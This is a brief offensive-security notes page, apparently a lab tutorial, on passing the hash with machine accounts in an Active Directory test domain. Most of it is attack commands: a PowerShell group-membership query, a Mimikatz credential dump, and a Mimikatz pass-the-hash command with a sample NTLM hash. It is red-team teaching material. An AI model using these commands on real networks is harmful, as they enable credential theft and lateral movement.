# Pass the Hash with Machine$ Accounts

## Execution

Finding domain computers that are members of interesting groups:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-16-03-19.png)

Extracting the machine WS01$ NTLM hash after the admin privileges were gained on the system:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
sekurlsa::logonPasswords
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-15-29-17.png)

![](../../.gitbook/assets/screenshot-from-2018-12-29-15-47-10.png)

Passing the hash:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/peek-2018-12-29-15-49.gif)



## References

{% embed url="https://www.c0d3xpl0it.com/2018/05/machine-accounts-in-pentest-engagement.html?m=1" %}

